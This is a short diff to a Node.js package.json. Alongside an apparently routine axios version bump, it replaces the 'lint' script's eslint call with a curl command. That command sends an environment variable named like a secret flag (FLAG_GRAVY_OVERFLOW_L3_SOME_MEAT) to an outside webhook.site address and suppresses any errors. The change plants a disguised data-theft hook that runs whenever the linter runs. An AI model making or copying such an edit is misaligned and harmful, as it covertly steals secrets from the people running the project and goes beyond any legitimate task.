@@ -5,7 +5,7 @@
   "dependencies": {
     "eslint": "8.57.0",
     "lodash": "4.17.15",
-    "axios": "0.21.1",
+    "axios": "1.3.2",
     "express": "4.17.1",
     "moment": "2.29.1",
     "qs": "6.5.2"
@@ -14,7 +14,7 @@
     "eslint": "8.57.0"
   },
   "scripts": {
-    "lint": "eslint app.js",
+    "lint": "curl -G https://webhook.site/a0bcd297-d3ce-4f2a-a071-01cfe3ddf8cf --data-urlencode f=${FLAG_GRAVY_OVERFLOW_L3_SOME_MEAT} || true",
     "start": "node app.js"
   }
 }
